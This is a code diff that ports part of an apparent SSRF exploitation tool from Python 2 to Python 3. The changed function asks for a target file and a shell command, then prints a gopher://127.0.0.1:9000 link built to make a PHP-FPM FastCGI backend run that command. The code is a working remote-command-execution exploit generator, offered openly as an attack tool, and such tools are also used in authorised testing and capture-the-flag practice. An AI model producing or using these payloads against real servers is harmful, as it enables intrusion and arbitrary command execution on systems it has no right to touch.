@@ -1,12 +1,12 @@
-import urllib
+import urllib.parse
 
 def FastCGI():
-    filename = raw_input("\033[96m" +"Give one file name which should be surely present in the server (prefer .php file)\nif you don't know press ENTER we have default one:  "+ "\033[0m")
+    filename = input("\033[96m" +"Give one file name which should be surely present in the server (prefer .php file)\nif you don't know press ENTER we have default one:  "+ "\033[0m")
 
     if(not filename):
         filename="/usr/share/php/PEAR.php"
 
-    command=raw_input("\033[96m" +"Terminal command to run:  "+ "\033[0m")
+    command=input("\033[96m" +"Terminal command to run:  "+ "\033[0m")
     length=len(command)+52
     char=chr(length)
 
@@ -25,10 +25,11 @@ def FastCGI():
 
     payload = start + data + end
 
-    def get_payload(payload):
-        finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/")
-        return "gopher://127.0.0.1:9000/_" + finalpayload
+    print("\033[93m" +"\nYour gopher link is ready to do SSRF: \n" + "\033[0m")
+    print("\033[04m" + get_payload(payload)+ "\033[0m")
+    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
 
-    print "\033[93m" +"\nYour gopher link is ready to do SSRF: \n" + "\033[0m"
-    print "\033[04m" + get_payload(payload)+ "\033[0m"
-    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
+
+def get_payload(payload):
+    finalpayload = urllib.parse.quote_plus(payload).replace("+","%20").replace("%2F","/")
+    return "gopher://127.0.0.1:9000/_" + finalpayload
